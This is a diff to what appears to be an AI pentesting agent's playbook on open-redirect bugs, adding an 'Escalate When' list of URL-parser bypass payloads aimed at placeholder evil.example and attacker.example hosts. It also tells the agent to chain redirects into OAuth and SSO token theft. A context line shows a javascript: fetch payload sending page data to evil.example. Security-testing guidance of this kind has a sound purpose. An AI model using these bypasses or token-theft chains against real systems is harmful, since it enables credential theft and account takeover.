@@ -317,6 +317,13 @@ https://target.example/page?redirect=javascript:fetch('https://evil.example/'+do
 - Open redirect confirmed but no chain opportunity (no OAuth, no trusted-domain phishing value, no javascript: URI) → record as LOW, move on quickly
 - OAuth token theft chain confirmed → HIGH/CRITICAL, record immediately and stop testing other redirect params
 
+## Escalate When
+- The validator accepts any of: `//evil.example`, `/\evil.example`, `https://trusted.example.evil.example`, `https://trusted.example@evil.example`, backslash-normalization (`https:/\evil.example`), or IDN/punycode lookalikes — the parser disagrees with the browser, enumerate the full URL-parser confusion set
+- The parameter is part of an OAuth `redirect_uri`, SSO `returnTo`, SAML `RelayState`, post-login `next`, or password-reset callback — token/code theft is the payoff, chain the redirect and capture the credential material delivered to the attacker origin
+- A `javascript:`, `data:`, or `vbscript:` scheme is accepted (even after filtering) — this is XSS not phishing, escalate severity and enumerate sinks (`window.location`, anchor `href`, meta refresh)
+- The redirect target is validated by substring/endsWith/startsWith rather than host parsing — craft `https://trusted.example.attacker.example` or `https://attacker.example/trusted.example` to confirm the parser flaw
+- The redirect is server-side (302 Location) rather than client JS — server redirects carry cookies and participate in OAuth flows that client-side redirects do not, test chain value before downgrading
+
 ## Extended Resources
 
 - `agent/references/payloads/open-redirect-payloads.md` — URL parsing confusion, protocol-relative, unicode normalization
